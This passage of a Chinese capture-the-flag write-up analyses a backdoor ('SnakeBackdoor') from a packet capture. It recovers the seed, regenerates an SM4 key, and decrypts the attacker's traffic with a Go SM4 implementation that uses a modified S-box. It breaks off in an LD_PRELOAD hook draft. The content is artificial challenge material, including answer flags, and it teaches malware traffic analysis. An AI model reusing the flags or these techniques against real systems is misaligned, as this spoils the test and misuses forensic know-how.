所以我们去把连接成功后发的第一个数据找到，按照相同逻辑在 `linux` 上运行 `c` 生成密钥即可。

![[第三届长城杯初赛SnakeBackdoor-260114-213638.png]]

如上图，我们找一下端口号为 `58782` 的包，然后找到三次握手后的第一个数据，为 `0x34952046`。

### 5.4 多字节整数的大小端转换

有一点需要注意的就是，在收到/发送像种子数据这种多字节整数时，代码里都会调用大小端转换的逻辑，如下面所示：

```c
seed = (seed_ >> 8) & 0xFF00 | (seed_ << 8) & 0xFF0000 | (seed_ << 24) | HIBYTE(seed_);
command_len = (command_len >> 8) & 0xFF00 | (command_len << 8) & 0xFF0000 | (command_len << 24) | HIBYTE(command_len);
res_len = (res_len_ >> 8) & 0xFF00 | (res_len_ << 8) & 0xFF0000 | (res_len_ << 24) | (res_len_ >> 24);
```

而代码中实际的加密后的数据接收却没有调用大小端转换函数，所以我们有必要探究一下。

我们用 `c` 语言分别写 `server.c` 和 `client.c` 去测试收发一个多字节整形和一个字节数组，然后用 `tcpdump` 抓包看看实际传输的数据的大小端。

为此，我们写下面两个代码：

```c
// client.c

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

int main(int argc, char const *argv[]) {
  int fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

  struct sockaddr_in serv_addr;
  memset(&serv_addr, 0, sizeof(serv_addr));
  serv_addr.sin_family = AF_INET;
  serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
  serv_addr.sin_port = htons(8080);

  connect(fd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));

  uint32_t buf = 0xaabbccdd;
  // uint8_t buf[] = { 0xaa, 0xbb, 0xcc, 0xdd };
  write(fd, &buf, sizeof(buf));

  close(fd);

  return 0;
}
```

```c
// server.c

#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>

int main() {
  int fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

  struct sockaddr_in serv_addr;
  memset(&serv_addr, 0, sizeof(serv_addr));
  serv_addr.sin_family = AF_INET;
  serv_addr.sin_addr.s_addr = inet_addr("0.0.0.0");
  serv_addr.sin_port = htons(8080);

  bind(fd, (const struct sockaddr *)&serv_addr, sizeof(serv_addr));

  listen(fd, 20);

  struct sockaddr_in clnt_addr;
  socklen_t clnt_addr_size = sizeof(clnt_addr);
  int clnt_fd = accept(fd, (struct sockaddr *)&clnt_addr, &clnt_addr_size);

  uint32_t buf;
  // uint8_t buf[4];
  ssize_t n = read(clnt_fd, &buf, sizeof(buf));
  if (n != sizeof(buf)) {
    perror("出错了");
  }
  printf("%x", buf);

  close(clnt_fd);
  close(fd);
}
```

分别编译好两个文件，然后键入下面的命令用 `tcpdump` 监听回环网卡的 `8080`

```bash
sudo tcpdump -i lo port 8080 -nn -X
```

接着，运行两个文件：

![[第三届长城杯初赛SnakeBackdoor-260114-215435.png]]

可以看到正确输出了我们发送的数据 `0xaabbccdd`，我们再看看 `tcpdump` 抓到的包：

![[第三届长城杯初赛SnakeBackdoor-260114-215613.png]]

可以发现用的就是操作系统原来的小端序 (哪怕网络通信的各种字段一般用大端序，这不影响内容本身)。

而前面我们分析的代码中，对于多字节整数的收发会执行一遍大小端转换的原因，大概是两端约定了数据在网络包中用大端序，到了本地在转换为小端序。

现在我们再改一下自己写的测试代码：

```c
// client.c
  // uint32_t buf = 0xaabbccdd;
  // write(fd, &buf, sizeof(buf));
  uint8_t buf[] = { 0xaa, 0xbb, 0xcc, 0xdd };
  write(fd, buf, sizeof(buf));

// server.c
  // uint32_t buf;
  // ssize_t n = read(clnt_fd, &buf, sizeof(buf));
  uint8_t buf[4];
  ssize_t n = read(clnt_fd, buf, sizeof(buf));
```

测试一下字节数组在 `tcp` 中是怎么传输的 (其实大小端序只跟多字节整数这种一个数据整体占了超过一字节的数据有关，而字节数组中元素的位置是由下标决定的，跟大小端序无关)

![[第三届长城杯初赛SnakeBackdoor-260114-220457.png]]

可以看到，数据是正常按下标顺序分布的；这也是为什么之前的代码中实际加密数据的收发都没有转换大小端，因为加密数据本质上是字节数组，这种东西按下标顺序来就行了，不用转换。

### 5.5 用找到的种子生成密钥

由于约定是 `tcp` 中传输的数据按大端处理，所以我们直接把 `wireshark` 上的数据原原本本地复制下来就是种子了。

然后我们跟进 `init_rk` 中看一下，会发现这个里面对 `rand()` 生成的密钥进行了大小端转换，这是可能是因为 `SM4` 算法中用的是大端序。

```c
(BYTE2(MK_[i]) << 8) | (BYTE1(MK_[i]) << 16) | (LOBYTE(MK_[i]) << 24) | HIBYTE(MK_[i]);
```

![[第三届长城杯初赛SnakeBackdoor-260114-220917.png]]

注意一下把 `rand()` 生成的数据用 `htonl()` 转换一下，其他的都很简单了，生成密钥的 `exp` 如下：

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <arpa/inet.h>

int main() {
  uint32_t seed = 0x34952046;
  srand(seed);
  uint32_t secret[4];
  for (int i = 0; i < 4; i++) {
    secret[i] = htonl(rand());
    printf("%08x", secret[i]);
  }
}
```

运行，输出 `ac46fb610b313b4f32fc642d8834b456`，所以：

```flag5
flag{ac46fb610b313b4f32fc642d8834b456}
```

## 6 步骤六

> [!info]
> 请提交攻击者获取服务器中的 flag。结果提交形式：flag{xxxx}

上面已经知道攻击者用一个木马 `shell` 接收加密的数据，解密后作为命令执行，结果再加密后返回，所以这里我的思路是把流量包中攻击者与木马传输的数据提取出来，用上题得到的密钥 `SM4` 解密，从而看到 `flag`

### 6.1 收集加密通信数据

由于它的通信约定是先发长度再发实际内容，再加上 `pkcs#7` 填充后的数据至少有 `16` 长度 (长度为 `16` 的整数倍)，所以我们很容易找到下面这些数据：

```
"49b351855f211b85bd012f80ce8ed5b3",
"2cc5becb37ca595a89445461c6512efc",
"b863696da0c6bb28da46e09069dd644f",
"87e8faa921f3e67c530f1b6740a9d439794e426716d49f5e949d5d56f81ed54a97f6cc6752fcf7aa408a94e6a59029e7",
"b7c88bb0d92308a57f83d08a90ae024c",
"91fc3c4dc278b1afc5636adeca578f3fe37c16fa66fae433d0d7eb331e7926025ad84833f28fc2641bf05e058be36ed06b3ba79fb66a1ae4192c51152e87a1c6abf66f0a1038689d2137f94d6a686b946120ea2d6fbe312786411b701a353ab035de9c7dc81abfa0dfef55c14cd1f99e07cc2bccec85db48d820038d8c1273024cd80f99e761e2dc2ca5f79f97eb5e01c74a7807ba9f29d99338ea1962daba592f2f212ca8686cf37880755f82949cce1e38a7cd2c8f4a79e5a5b640375a94faa0dd2df11225df777845781f0562aab86e09effa9d6254ac8db8853036f680c37d9a047eafd0b65d7b8715cdd7f9becf3046afd113dc0b8b714b002cafc2482c4f240dab7cfa61ea30b3d4595b67563fde635bbd243f3ea8cca3d6bad779161939dd3acd3de84e9f0345f8e4c7b1dd0909922334bbbc0ccd412b8d8216337b515ad84833f28fc2641bf05e058be36ed08c073a5d9d24304eaf50c29d1f3cde1893acc5e4ba171ed4d1474d3f0046208ba565589ace3ecd59e248c22663b789ff5ff9eb73ea4fff8399159d10f689487d553333ce4ec0c0c568a5f532a015a6f1801f0d820a0b8a744b915248b842a2448d9b6d2d0493c7e8a32b86c05a26127a02bbb99ba83f410b1c2b9bbc1b5e39a5558f467eebd32b38a3e208c2534f74b450e412c2ab730ec45b224a2ba5255e24fd831db1d900c8a57967b8ad6993fb3a9b2de1d2d6093eb14a02ddd4cb29275b4cd80f99e761e2dc2ca5f79f97eb5e01ae78b840270ec94dd8eaeb7d15b9b74406f4e96257e0eec382482d4dcfb64257b9e83711e847957323fedb65b189afe150ae2213b7c9d2788dce7ba88cf8774a9bbe15c3832f0c136b1397209a7d6a9f37d3bc0a242f029d6a4feb9b26a55d786120ea2d6fbe312786411b701a353ab0c81a54b98f519ef41ce3775f5b2c26c7ad644797d69604a9fd412ae25a28aec737d3bc0a242f029d6a4feb9b26a55d786120ea2d6fbe312786411b701a353ab0158df499dc5f4de223e3dca72bbf66f48ac1fc75b1be3cc2e4de7d370f88778a006daefea44d62d389eff227e4d031124cd80f99e761e2dc2ca5f79f97eb5e01507836a14c3f3e83d0a317cd2ab8048eba52c6ca5e547ff797fca0cd47c62f4b7356b3bc38bc81e646000cf069b2be56d9fe59bcf4063d0a0363b9209c4f3860c90967283e1b364810145ed6e7525074a1a2527c05163cd8d49595c493a9bc5e5d480f143d8f892dfd8f90b3e8d3ea20352c9d0ad901cc079bf2a592ae4c58be125fff2fb31ecdcd95dc2fcdefdf1c6101dabec17b13f2d04eb8851a3115be66d1778dfb4003a9f705ad133b196c32404734c892cda46767181cf7a0a38fb8ac6e0a04a6bff4b1e8a7bfdabe5ddabbf62f934f8f91898a41dd0a0fd7c83eb55d27fe795766e9fcf20b8b885081848690e58d3748a157c7801a3d5c42db28cebf582760ac945ac0fc2b72edfc43c01c919b5a749a422da155198cbe9e3a2806a32a4e4a8590bbcf0496b0e13a8be7fbb69d55fc3541905d448499cd88edf0c58f59205e9f89a115e0ca9b5c3ebd9415c631acc7f6b9de54a40a9fa7d606f95e4cd62cd0cb2eb4feb350d04c46ce6f8b8d0eaf46208b3b4d4508812cd908bce78846ad5c20a6dbb14f7373dfce61976b85e58d3748a157c7801a3d5c42db28cebf75ec1d1089052336e2c805f6e1d401dc35b7bb0bf188e8a9c2e8567a3ae0ec3bf6b9c05a0b6a9673c89693fbe7894b0135481fbddaf394773fad605eae99f4600e956dd8d489eb2ed159c598fabec5b17c8df9c4b414a371aa84b77eefea1bb42418ea7fd3709e2ef4850ddae503e92a0b4ff34aa7020c999bac051005b26fa5a0f828b51e588aeca3e690e9c84ff682164a86379ddda02b1d92f0dee9a1d0cb9cbdf5432cc4b943ba474c4f5467500b0b31d077cf5047aa9384cf4b6757ca370a5e0604fcd15bfedaefe87179f97cf0efe63431c3b3540eb2e459cb8250fc1993bea701c61b61b7ffc13777b2d9f9dc57d229f0489d6328",
"0f8e8c73baeb70cada6aa30d3a91d0c8f4f2a26dd4e3e7ad0c99810245ae92a05893d4b74323a37247cc6c9c417f8082ccef101bd31acdc79c8a673396353a030358d2a3db37019672b8042929a68fea5ba9965e5145940355e00debe46e80b75dd31b646f39d4cb3e057bc64c8e3b39a7c6d3bfdd41a836ff87620ec931e8a490f0ad33048de50841a959f4baac6fb0e36b389f6f5ecb3925b04a5d37f37479c0ed02b23f38c64e44300433b5a0cbc4063760642bba08473e11ef2c7be2f6bc0ac99cca4792b17dfe4f3358455566bb4e3006a200a87466f4dafea0bfa7a420220ca5ec4f5e73d89784fce2cfc878df8f3609576975a58ce58d3748a157c7801a3d5c42db28cebf152ab441a154dfbd83e6e929e62be820e41688e06d47bde780960ef807b3fd78bdf05032d4aa84948b384d9afd9fc12c95169f9ee5c386f60e32374951be448e92d4853b4c8ae7fbc715f4562156ba86b5adc49e400e7c227c617a26bbd908a27896015cf6f8532e5c04b5030abe4f7f0f6c167ab0ea204e76fdfca5e6311fee6403bb60415e43af2a10de078a479a8c644709a3082176ffb04af8535796b3acf83bcd500f288a491101dcea576f1dd97ba6ce01d8f1de4e98135bf20f394129672538325aaded45fd604b388019b12df57ff11b010ba7c39dc7f04fd26b770806b46d91016bd16e126c8d3f6c874acfe42ee6bc7030e24c62e9901103458ebd44fced6e5064c2f19da84dfff4c62f6c1088c3bc411ab9ab0f7eb772b85958d94f1775cb597f36010c045326de15287a5ee634e93ce07e0ad0ea5c9cebc60308823d603ef85287de24fb532cbc577b8fd49553f3ca6067dd2b58467a749571247d6c20d005178494c3c9ec028297a8360248ecd4a8d4a9088a0b27faba386dca644709a3082176ffb04af8535796b3ac02f30c6c0d7cc594e2bcafb487e74f12157ce37c1553c6382b1689c659eaeb23672538325aaded45fd604b388019b12df57ff11b010ba7c39dc7f04fd26b770804245b989b54cced122e6e9e9551efd011a479cd8db04b5fdcdb0cb75ba0039c44fced6e5064c2f19da84dfff4c62f6c5f4161bc70501782795e73b2032071d9a205839af1b4b42d35f628f79847bf3cd80c3faa03cab06d8cbeae800ce724a7823d603ef85287de24fb532cbc577b8fa014e820aedef4bbd9685845951995982ccf1a4cef2497d36c1dd18bd968932e5e197f709a77d04aa112373cc4c1d0ab",
"4331cfda21eeab8922fcc7acced16d1a17b02e8d2d9dfee48dc8f18e0dbbb2e4c4547e39d8c4aa2418d9fca52c9c4770",
"7f4b0ef4806983f164af6f46b71d3fce1e3c0bd00c4dd162b72c156f0f3aecd2afcabf551e08380db6fd20316f8a2729",
"de7cc756e5c97fed18a72a95af102dac48dc0810752bd7755157e5909974cbe0ce87241e7f01e3169e7a763a22008029",
"7b82a7a9e2cacaa29b6e70cec2a3302a",
"f958a8cea6721e88d1882e0f16e4da4b",
"7b82a7a9e2cacaa29b6e70cec2a3302a",
```

### 6.2 获取加密模式

从上面分析出的 `pkcs#7` 填充逻辑，以及下面这段报错信息的提示，我们很容易知道分组加密模式为 `ecb`，及将数据按每块 `16` 字节等分，最后一块不足的位置填充上不足的长度 (例如，如果缺了 9 个字节，这 9 个字节都填充上 `0x09`)；如果不缺，则单独增加一块，全部填充上 `0x10`(十进制 `16`) #知识/密码学/分组密码/模式/ecb

![[第三届长城杯初赛SnakeBackdoor-260114-223237.png]]

### 6.3 分析加密算法

按照 `ecb` 加密模式，用密钥 `ac46fb610b313b4f32fc642d8834b456` 去尝试用 `cyberchef` `sm4` 解密，会发现不行。

那我们就分析一下反编译的伪代码中的加密算法，正好在这里说一下是为什么用的加密算法是 `sm4`：

这里先贴一下我参考的文档 (其实就是 `SM4` 的国标文档，我发现这个文档本身写得就很好，完全不用专门找教程)

> [!quote] GB/T 32907-2016
> http://c.gb688.cn/bzgk/gb/showGb?type=online&hcno=7803DE42D3BC5E80B0C3E5D8E873D56A

下面两张图是反编译的伪代码和文档的算法描述的吻合之处，其中第一处是**密钥异或系统参数**的逻辑，第二处是**密钥拓展算法的第二步 (前面第一处是第一步)**，然后第三处符合描述的解密仅仅是**反转了轮密钥序**。

![[第三届长城杯初赛SnakeBackdoor-260114-223814.png]]

![[第三届长城杯初赛SnakeBackdoor-260114-224323.png]]

从下面两张图可以看到，他们的系统参数 `FK` 和固定参数 `CK` 是一致的。

![[第三届长城杯初赛SnakeBackdoor-260114-224743.png]]

![[第三届长城杯初赛SnakeBackdoor-260114-224857.png]]

然后这个 `Sbox` 前面是一致的，后面就不一致了；这也是我前面直接用 `cyberchef` 解不出来的原因。

![[第三届长城杯初赛SnakeBackdoor-260114-230538.png]]

### 6.4 法一：自己实现一个 `SM4`

这里我想到的是按照他的数据自己实现一个 `SM4` 算法，用这个算法解密就可以了；于是就实现了如下代码：

```go
// sm4.go
package main

import (
	"encoding/binary"
	"encoding/hex"
	"errors"
	"math/bits"
)

var FK = [4]uint32{0xA3B1BAC6, 0x56AA3350, 0x677D9197, 0xB27022DC}
var CK = [8 * 4]uint32{
	0x00070e15, 0x1c232a31, 0x383f464d, 0x545b6269,
	0x70777e85, 0x8c939aa1, 0xa8afb6bd, 0xc4cbd2d9,
	0xe0e7eef5, 0xfc030a11, 0x181f262d, 0x343b4249,
	0x50575e65, 0x6c737a81, 0x888f969d, 0xa4abb2b9,
	0xc0c7ced5, 0xdce3eaf1, 0xf8ff060d, 0x141b2229,
	0x30373e45, 0x4c535a61, 0x686f767d, 0x848b9299,
	0xa0a7aeb5, 0xbcc3cad1, 0xd8dfe6ed, 0xf4fb0209,
	0x10171e25, 0x2c333a41, 0x484f565d, 0x646b7279,
}
var Sbox = [16 * 16]uint8{
	0xD6, 0x90, 0xE9, 0xFE, 0xCC, 0xE1, 0x3D, 0xB7, 0x16, 0xB6, 0x14, 0xC2, 0x28, 0xFB, 0x2C, 0x05,
	0x2B, 0x67, 0x9A, 0x76, 0x2A, 0xBE, 0x04, 0xC3, 0xAA, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99,
	0x9C, 0x42, 0x50, 0xF4, 0x91, 0xEF, 0x98, 0x7A, 0x33, 0x54, 0x0B, 0x43, 0xED, 0xCF, 0xAC, 0x62,
	0xE4, 0xB3, 0x1C, 0xA9, 0xC9, 0x08, 0xE8, 0x95, 0x80, 0xDF, 0x94, 0xFA, 0x75, 0x8F, 0x3F, 0xA6,
	0x47, 0x07, 0xA7, 0xFC, 0xF3, 0x73, 0x17, 0xBA, 0x83, 0x59, 0x3C, 0x19, 0xE6, 0x85, 0x4F, 0xA8,
	0x68, 0x6B, 0x81, 0xB2, 0x71, 0x64, 0xDA, 0x8B, 0xF8, 0xEB, 0x0F, 0x4B, 0x70, 0x56, 0x9D, 0x35,
	0x1E, 0x24, 0x0E, 0x5E, 0x63, 0x58, 0xD1, 0xA2, 0x25, 0x22, 0x7C, 0x3B, 0x01, 0x21, 0x78, 0x87,
	0xD4, 0x00, 0x46, 0x57, 0x9F, 0xD3, 0x27, 0x52, 0x4C, 0x36, 0x02, 0xE7, 0xA0, 0xC4, 0xC8, 0x9E,
	0xEA, 0xBF, 0x8A, 0xD2, 0x40, 0xC7, 0x38, 0xB5, 0xA3, 0xF7, 0xF2, 0xCE, 0xF9, 0x61, 0x15, 0xA1,
	0xE0, 0xAE, 0x5D, 0xA4, 0x9B, 0x34, 0x1A, 0x55, 0xAD, 0x93, 0x32, 0x30, 0xF5, 0x8C, 0xB1, 0xE3,
	0x1D, 0xF6, 0xE2, 0x2E, 0x82, 0x66, 0xCA, 0x60, 0xC0, 0x29, 0x23, 0xAB, 0x0D, 0x53, 0x4E, 0x6F,
	0xD5, 0xDB, 0x39, 0xB8, 0x31, 0x11, 0x0C, 0x5A, 0xCB, 0x3E, 0x0A, 0x45, 0xE5, 0x94, 0x77, 0x5B,
	0x8D, 0x6D, 0x48, 0x41, 0x10, 0xBD, 0x09, 0xC1, 0x4A, 0x89, 0x0D, 0x6E, 0x97, 0xA1, 0x1D, 0x16,
	0x0A, 0xD9, 0x88, 0x6A, 0x96, 0xD1, 0x6B, 0x32, 0x02, 0x35, 0x46, 0x06, 0x7D, 0x65, 0x49, 0x8C,
	0xF0, 0x3E, 0x2D, 0x7A, 0x15, 0xFF, 0x05, 0x8E, 0x01, 0x84, 0x3C, 0x3A, 0x38, 0x53, 0x87, 0x7B,
	0x0B, 0x2B, 0x7E, 0x0F, 0xF6, 0x69, 0xA8, 0x5A, 0xB5, 0x4C, 0x1B, 0x39, 0x7F, 0x08, 0x8D, 0x1C,
}

type TType int

const (
	TT = TType(iota)
	T_
)

func tranUint32X4ToByteX16(uint32X4 []uint32) []byte {
	_ = uint32X4[3]
	res := make([]byte, 16)
	for i := range 4 {
		binary.BigEndian.PutUint32(res[4*i:4*(i+1)], uint32X4[i])
	}
	return res
}
func tranByteX16ToUint32X4(byteX16 []byte) []uint32 {
	_ = byteX16[15]
	res := make([]uint32, 4)
	for i := range res {
		res[i] = binary.BigEndian.Uint32(byteX16[4*i : 4*(i+1)])
	}
	return res
}

// 合成置换
func T(A uint32, tType TType) uint32 {
	// 非线性变换
	B := 0 |
		(uint32(Sbox[0xff&(A)]) << 24) |
		(uint32(Sbox[0xff&(A>>8)]) << 16) |
		(uint32(Sbox[0xff&(A>>16)]) << 8) |
		(uint32(Sbox[0xff&(A>>24)]))

	// 线性变换
	if tType == TT {
		return B ^
			bits.RotateLeft32(B, 2) ^ bits.RotateLeft32(B, 10) ^
			bits.RotateLeft32(B, 18) ^ bits.RotateLeft32(B, 24)
	}
	return B ^
		bits.RotateLeft32(B, 13) ^ bits.RotateLeft32(B, 23)
}

// 密钥扩展
func KeyExp(key []byte) []uint32 {
	_ = key[15]

	MK := tranByteX16ToUint32X4(key)

	K := make([]uint32, 36)
	for i := range 4 {
		K[i] = MK[i] ^ FK[i]
	}

	rk := make([]uint32, 32)
	for i := range rk {
		res := K[i] ^ T(K[i+1]^K[i+2]^K[i+3]^CK[i], T_)
		rk[i], K[i+4] = res, res
	}
	return rk
}

func Sm4(input []byte, rk []uint32) []byte {
	X := make([]uint32, 36)
	copy(X, tranByteX16ToUint32X4(input))

	for i := range 32 {
		X[i+4] = X[i] ^ T(X[i+1]^X[i+2]^X[i+3]^rk[i], TT)
	}

	return tranUint32X4ToByteX16(
		[]uint32{X[35], X[34], X[33], X[32]},
	)
}

func EcbPadding(data []byte) []byte {
	resLen := 16 * (len(data)/16 + 1)
	paddingLen := resLen - len(data)
	for range paddingLen {
		data = append(data, byte(paddingLen))
	}
	return data
}

func EcbDePadding(data []byte) []byte {
	paddingLen := data[len(data)-1]
	if paddingLen > 0 && paddingLen <= 16 {
		data = data[:len(data)-int(paddingLen)]
	}
	return data
}

func Decode(hexStr string, rk []uint32) (string, error) {
	cipher, err := hex.DecodeString(hexStr)
	if err != nil {
		return "", err
	}
	if len(cipher)%16 != 0 {
		return "", errors.New("乱码")
	}

	res := make([]byte, len(cipher))
	for i := 0; i <= len(cipher)-16; i += 16 {
		res = append(res, Sm4(cipher[i:i+16], rk)...)
	}

	return string(EcbDePadding(res)), nil
}
```

然后写一个 `main` 函数解密前面收集的数据：

```go
// main.go
package main

import (
	"encoding/hex"
	"fmt"
	"slices"
)

func main() {
	ciphers := []string{
		"49b351855f211b85bd012f80ce8ed5b3",
		"2cc5becb37ca595a89445461c6512efc",
		"b863696da0c6bb28da46e09069dd644f",
		"87e8faa921f3e67c530f1b6740a9d439794e426716d49f5e949d5d56f81ed54a97f6cc6752fcf7aa408a94e6a59029e7",
		"b7c88bb0d92308a57f83d08a90ae024c",
		"91fc3c4dc278b1afc5636adeca578f3fe37c16fa66fae433d0d7eb331e7926025ad84833f28fc2641bf05e058be36ed06b3ba79fb66a1ae4192c51152e87a1c6abf66f0a1038689d2137f94d6a686b946120ea2d6fbe312786411b701a353ab035de9c7dc81abfa0dfef55c14cd1f99e07cc2bccec85db48d820038d8c1273024cd80f99e761e2dc2ca5f79f97eb5e01c74a7807ba9f29d99338ea1962daba592f2f212ca8686cf37880755f82949cce1e38a7cd2c8f4a79e5a5b640375a94faa0dd2df11225df777845781f0562aab86e09effa9d6254ac8db8853036f680c37d9a047eafd0b65d7b8715cdd7f9becf3046afd113dc0b8b714b002cafc2482c4f240dab7cfa61ea30b3d4595b67563fde635bbd243f3ea8cca3d6bad779161939dd3acd3de84e9f0345f8e4c7b1dd0909922334bbbc0ccd412b8d8216337b515ad84833f28fc2641bf05e058be36ed08c073a5d9d24304eaf50c29d1f3cde1893acc5e4ba171ed4d1474d3f0046208ba565589ace3ecd59e248c22663b789ff5ff9eb73ea4fff8399159d10f689487d553333ce4ec0c0c568a5f532a015a6f1801f0d820a0b8a744b915248b842a2448d9b6d2d0493c7e8a32b86c05a26127a02bbb99ba83f410b1c2b9bbc1b5e39a5558f467eebd32b38a3e208c2534f74b450e412c2ab730ec45b224a2ba5255e24fd831db1d900c8a57967b8ad6993fb3a9b2de1d2d6093eb14a02ddd4cb29275b4cd80f99e761e2dc2ca5f79f97eb5e01ae78b840270ec94dd8eaeb7d15b9b74406f4e96257e0eec382482d4dcfb64257b9e83711e847957323fedb65b189afe150ae2213b7c9d2788dce7ba88cf8774a9bbe15c3832f0c136b1397209a7d6a9f37d3bc0a242f029d6a4feb9b26a55d786120ea2d6fbe312786411b701a353ab0c81a54b98f519ef41ce3775f5b2c26c7ad644797d69604a9fd412ae25a28aec737d3bc0a242f029d6a4feb9b26a55d786120ea2d6fbe312786411b701a353ab0158df499dc5f4de223e3dca72bbf66f48ac1fc75b1be3cc2e4de7d370f88778a006daefea44d62d389eff227e4d031124cd80f99e761e2dc2ca5f79f97eb5e01507836a14c3f3e83d0a317cd2ab8048eba52c6ca5e547ff797fca0cd47c62f4b7356b3bc38bc81e646000cf069b2be56d9fe59bcf4063d0a0363b9209c4f3860c90967283e1b364810145ed6e7525074a1a2527c05163cd8d49595c493a9bc5e5d480f143d8f892dfd8f90b3e8d3ea20352c9d0ad901cc079bf2a592ae4c58be125fff2fb31ecdcd95dc2fcdefdf1c6101dabec17b13f2d04eb8851a3115be66d1778dfb4003a9f705ad133b196c32404734c892cda46767181cf7a0a38fb8ac6e0a04a6bff4b1e8a7bfdabe5ddabbf62f934f8f91898a41dd0a0fd7c83eb55d27fe795766e9fcf20b8b885081848690e58d3748a157c7801a3d5c42db28cebf582760ac945ac0fc2b72edfc43c01c919b5a749a422da155198cbe9e3a2806a32a4e4a8590bbcf0496b0e13a8be7fbb69d55fc3541905d448499cd88edf0c58f59205e9f89a115e0ca9b5c3ebd9415c631acc7f6b9de54a40a9fa7d606f95e4cd62cd0cb2eb4feb350d04c46ce6f8b8d0eaf46208b3b4d4508812cd908bce78846ad5c20a6dbb14f7373dfce61976b85e58d3748a157c7801a3d5c42db28cebf75ec1d1089052336e2c805f6e1d401dc35b7bb0bf188e8a9c2e8567a3ae0ec3bf6b9c05a0b6a9673c89693fbe7894b0135481fbddaf394773fad605eae99f4600e956dd8d489eb2ed159c598fabec5b17c8df9c4b414a371aa84b77eefea1bb42418ea7fd3709e2ef4850ddae503e92a0b4ff34aa7020c999bac051005b26fa5a0f828b51e588aeca3e690e9c84ff682164a86379ddda02b1d92f0dee9a1d0cb9cbdf5432cc4b943ba474c4f5467500b0b31d077cf5047aa9384cf4b6757ca370a5e0604fcd15bfedaefe87179f97cf0efe63431c3b3540eb2e459cb8250fc1993bea701c61b61b7ffc13777b2d9f9dc57d229f0489d6328",
		"0f8e8c73baeb70cada6aa30d3a91d0c8f4f2a26dd4e3e7ad0c99810245ae92a05893d4b74323a37247cc6c9c417f8082ccef101bd31acdc79c8a673396353a030358d2a3db37019672b8042929a68fea5ba9965e5145940355e00debe46e80b75dd31b646f39d4cb3e057bc64c8e3b39a7c6d3bfdd41a836ff87620ec931e8a490f0ad33048de50841a959f4baac6fb0e36b389f6f5ecb3925b04a5d37f37479c0ed02b23f38c64e44300433b5a0cbc4063760642bba08473e11ef2c7be2f6bc0ac99cca4792b17dfe4f3358455566bb4e3006a200a87466f4dafea0bfa7a420220ca5ec4f5e73d89784fce2cfc878df8f3609576975a58ce58d3748a157c7801a3d5c42db28cebf152ab441a154dfbd83e6e929e62be820e41688e06d47bde780960ef807b3fd78bdf05032d4aa84948b384d9afd9fc12c95169f9ee5c386f60e32374951be448e92d4853b4c8ae7fbc715f4562156ba86b5adc49e400e7c227c617a26bbd908a27896015cf6f8532e5c04b5030abe4f7f0f6c167ab0ea204e76fdfca5e6311fee6403bb60415e43af2a10de078a479a8c644709a3082176ffb04af8535796b3acf83bcd500f288a491101dcea576f1dd97ba6ce01d8f1de4e98135bf20f394129672538325aaded45fd604b388019b12df57ff11b010ba7c39dc7f04fd26b770806b46d91016bd16e126c8d3f6c874acfe42ee6bc7030e24c62e9901103458ebd44fced6e5064c2f19da84dfff4c62f6c1088c3bc411ab9ab0f7eb772b85958d94f1775cb597f36010c045326de15287a5ee634e93ce07e0ad0ea5c9cebc60308823d603ef85287de24fb532cbc577b8fd49553f3ca6067dd2b58467a749571247d6c20d005178494c3c9ec028297a8360248ecd4a8d4a9088a0b27faba386dca644709a3082176ffb04af8535796b3ac02f30c6c0d7cc594e2bcafb487e74f12157ce37c1553c6382b1689c659eaeb23672538325aaded45fd604b388019b12df57ff11b010ba7c39dc7f04fd26b770804245b989b54cced122e6e9e9551efd011a479cd8db04b5fdcdb0cb75ba0039c44fced6e5064c2f19da84dfff4c62f6c5f4161bc70501782795e73b2032071d9a205839af1b4b42d35f628f79847bf3cd80c3faa03cab06d8cbeae800ce724a7823d603ef85287de24fb532cbc577b8fa014e820aedef4bbd9685845951995982ccf1a4cef2497d36c1dd18bd968932e5e197f709a77d04aa112373cc4c1d0ab",
		"4331cfda21eeab8922fcc7acced16d1a17b02e8d2d9dfee48dc8f18e0dbbb2e4c4547e39d8c4aa2418d9fca52c9c4770",
		"7f4b0ef4806983f164af6f46b71d3fce1e3c0bd00c4dd162b72c156f0f3aecd2afcabf551e08380db6fd20316f8a2729",
		"de7cc756e5c97fed18a72a95af102dac48dc0810752bd7755157e5909974cbe0ce87241e7f01e3169e7a763a22008029",
		"7b82a7a9e2cacaa29b6e70cec2a3302a",
		"f958a8cea6721e88d1882e0f16e4da4b",
		"7b82a7a9e2cacaa29b6e70cec2a3302a",
	}
	key, err := hex.DecodeString("ac46fb610b313b4f32fc642d8834b456")
	if err != nil {
		panic(err)
	}
	rk := KeyExp(key)
	slices.Reverse(rk)

	for i, cipher := range ciphers {
		res, err := Decode(cipher, rk)
		if err != nil {
			res = err.Error()
		}
		fmt.Printf("第 %v 条数据: %v\n", i+1, res)
	}
}
```

然后就很容易从输出中看到 `flag`

![[第三届长城杯初赛SnakeBackdoor-260114-230959.png]]

把字符替换还原后，就是正确的 `flag` 了 (注意不要把 `flag{}` 还原成 `f1ag`)

```bash
echo 'flag{6894c9ec-7l9b-46O5-82bf-4felde27738f}' | tr 'l' '1' | tr 'O' '0' | tr 'f1ag' 'flag'
```

```flag6
flag{6894c9ec-7l9b-4605-82bf-4felde27738f}
```

### 6.5 法二：hook

除了自己实现 `sm4` 之外，还可以用 `hook` 的方法，只需编译一个动态库，去覆盖木马程序内部用到的一些函数符号，然后在木马程序执行前使用 `LD_PRELOAD=./hook.so` 去先加载我们自己编译的符号，这样通过动态链接，就能覆盖原本的函数符号。

具体来说，我们主要是覆盖 `recv` 函数，让木马程序读取我们指定的数据；然后 `hook` `popen` 函数，使得我们指定的数据被程序解密后传入这个函数，然后我们 `hook` 版本的 `popen` 再直接打印，就能直接看到解密后的数据了；至于 `popen` 原本的功能是讲输入当作系统命令执行，为了让程序不报错，我们模拟其命令执行失败的逻辑就好了，这样后面的东西就都可以忽略了。

具体该怎么 `hook`，我们有草稿如下：

```
int connect(int fd, const struct sockaddr *addr, socklen_t len) {
  return 1
}

ssize_t recv(int fd, void *buf, size_t n, int flags) {
